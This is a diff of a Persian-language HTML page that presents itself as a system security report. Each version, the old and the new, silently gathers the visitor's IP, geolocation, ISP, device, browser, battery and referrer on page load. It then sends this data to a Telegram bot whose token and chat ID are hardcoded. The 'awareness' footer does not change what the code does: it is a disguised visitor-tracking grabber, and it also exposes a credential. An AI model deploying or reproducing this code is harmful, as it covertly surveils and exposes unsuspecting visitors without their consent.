@@ -2,59 +2,150 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8" />
-  <title>در حال بارگیری...</title>
-</head>
-<body>
-  <h3>در حال بارگیری اطلاعات امنیتی...</h3>
-
-  <script>
-    async function getInfoAndSend() {
-      let ipData = await fetch("https://ipapi.co/json/")
-        .then(res => res.json())
-        .catch(() => null);
-
-      const battery = await navigator.getBattery?.();
-      const info = {
-        ip: ipData?.ip || "نامشخص",
-        city: ipData?.city || "نامشخص",
-        region: ipData?.region || "",
-        country: ipData?.country_name || "نامشخص",
-        loc: `${ipData?.latitude || "-"},${ipData?.longitude || "-"}`,
-        org: ipData?.org || "نامشخص",
-        timezone: ipData?.timezone || "نامشخص",
-        os: navigator.platform,
-        browser: navigator.userAgent,
-        battery: battery ? `${(battery.level * 100).toFixed(0)}%` : "نامشخص",
-        charging: battery ? battery.charging : "نامشخص",
-        time: new Date().toString(),
-      };
-
-      const msg = `
-[هشدار امنیتی]
-
-آی‌پی: ${info.ip}
-مکان: ${info.city}, ${info.region}, ${info.country}
-ISP: ${info.org}
-سیستم‌عامل: ${info.os}
-مرورگر: ${info.browser}
-باتری: ${info.battery} (${info.charging ? "در حال شارژ" : "نه"})
-موقعیت مکانی: ${info.loc}
-منطقه زمانی: ${info.timezone}
-زمان محلی: ${info.time}
-      `;
-
-      const token = "8194809349:AAEqk8M8sOWGxQwDO0tNlybKDki26JENT4w";
-      const chat_id = "7980459274";
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-      fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id, text: msg }),
-      });
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>گزارش امنیتی سیستم شما</title>
+  <script src="https://cdn.jsdelivr.net/npm/bowser@2.11.0/es5.min.js"></script>
+  <style>
+    body {
+      font-family: Vazirmatn, sans-serif;
+      background: #f5f7fa;
+      direction: rtl;
+      text-align: center;
+      padding: 30px;
     }
 
-    getInfoAndSend();
+    .container {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      padding: 30px;
+      max-width: 600px;
+      margin: auto;
+    }
+
+    h1 {
+      color: #333;
+      font-size: 24px;
+    }
+
+    #loading {
+      margin: 20px 0;
+      font-weight: bold;
+      color: #888;
+    }
+
+    #done {
+      color: green;
+      font-weight: bold;
+    }
+
+    .info {
+      text-align: right;
+      font-size: 14px;
+      margin-top: 20px;
+      line-height: 1.8;
+      direction: ltr;
+    }
+
+    footer {
+      margin-top: 40px;
+      font-size: 12px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>در حال بررسی وضعیت امنیتی...</h1>
+    <div id="loading">در حال دریافت اطلاعات سیستم شما</div>
+    <div id="done" style="display: none;">اطلاعات با موفقیت ارسال شد</div>
+    <div class="info" id="info"></div>
+  </div>
+
+  <footer>
+    توسعه یافته برای آگاهی‌بخشی امنیتی | نسخه آزمایشی
+  </footer>
+
+  <script>
+    async function collectAndSendData() {
+      const loading = document.getElementById("loading");
+      const done = document.getElementById("done");
+      const infoBox = document.getElementById("info");
+
+      try {
+        const [ipData, battery] = await Promise.all([
+          fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => null),
+          navigator.getBattery?.().catch(() => null)
+        ]);
+
+        const browser = window.bowser.getParser(navigator.userAgent).getResult();
+
+        const info = {
+          ip: ipData?.ip || "نامشخص",
+          location: `${ipData?.city || "-"}, ${ipData?.region || "-"}, ${ipData?.country_name || "-"}`,
+          org: ipData?.org || "نامشخص",
+          timezone: ipData?.timezone || "نامشخص",
+          ip_time: new Date().toLocaleString("fa-IR", { timeZone: ipData?.timezone || "Asia/Tehran" }),
+          local_time: new Date().toLocaleString("fa-IR"),
+          os: `${browser.os.name} ${browser.os.versionName}`,
+          browser: `${browser.browser.name} ${browser.browser.version}`,
+          device: browser.platform.type || "نامشخص",
+          screen: `${screen.width}x${screen.height}`,
+          battery: battery ? `${(battery.level * 100).toFixed(0)}%` : "نامشخص",
+          charging: battery ? (battery.charging ? "بله" : "خیر") : "نامشخص",
+          language: navigator.language,
+          referrer: document.referrer || "مستقیم"
+        };
+
+        const message = `
+[گزارش ورود جدید]
+
+IP: ${info.ip}
+مکان: ${info.location}
+ارائه‌دهنده: ${info.org}
+سیستم‌عامل: ${info.os}
+مرورگر: ${info.browser}
+نوع دستگاه: ${info.device}
+رزولوشن صفحه: ${info.screen}
+زبان مرورگر: ${info.language}
+وضعیت باتری: ${info.battery} - شارژ: ${info.charging}
+ارجاع‌دهنده: ${info.referrer}
+زمان محلی: ${info.local_time}
+زمان منطقه‌ای: ${info.ip_time}
+        `;
+
+        // جایگزین کن با توکن و چت آیدی خودت
+        const token = "8194809349:AAEqk8M8sOWGxQwDO0tNlybKDki26JENT4w";
+        const chat_id = "7980459274";
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+        await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id, text: message })
+        });
+
+        loading.style.display = "none";
+        done.style.display = "block";
+
+        // نمایش خلاصه روی صفحه
+        infoBox.innerHTML = `
+          IP: ${info.ip}<br>
+          مکان: ${info.location}<br>
+          سیستم‌عامل: ${info.os}<br>
+          مرورگر: ${info.browser}<br>
+          دستگاه: ${info.device}<br>
+          رزولوشن: ${info.screen}<br>
+          باتری: ${info.battery} (${info.charging})<br>
+          زمان: ${info.local_time}<br>
+        `;
+      } catch (err) {
+        loading.innerText = "خطا در دریافت یا ارسال اطلاعات.";
+        console.error("خطا:", err);
+      }
+    }
+
+    collectAndSendData();
   </script>
 </body>
 </html>
